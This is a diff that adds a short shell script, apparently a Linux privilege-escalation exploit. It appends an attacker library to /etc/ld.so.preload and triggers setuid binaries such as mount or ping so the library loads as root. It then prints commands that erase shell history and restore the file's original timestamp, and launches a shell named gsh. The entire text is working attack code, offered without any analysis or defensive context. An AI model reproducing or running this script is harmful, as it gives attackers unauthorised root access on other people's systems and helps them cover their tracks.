@@ -1,0 +1,32 @@
+#!/bin/sh
+
+touch -r /etc/ld.so.preload orig
+cp /etc/ld.so.preload .
+
+echo `pwd`/libd.so.1 >> /etc/ld.so.preload
+
+if [ -u /bin/mount ] ; then
+  /bin/mount
+elif [ -u /bin/ping ] ; then
+  /bin/ping
+elif [ -u /bin/traceroute ] ; then
+  /bin/traceroute
+elif [ -u /usr/bin/rsh ] ; then
+  /usr/bin/rsh
+fi
+
+if [ -u $1 ] ; then
+  $1
+fi
+
+echo
+echo
+echo unset HISTFILE
+echo unset HISTSIZE
+echo unset HISTFILESIZE
+echo "cat ld.so.preload > /etc/ld.so.preload"
+echo touch -r orig /etc/ld.so.preload
+echo
+echo
+
+./gsh
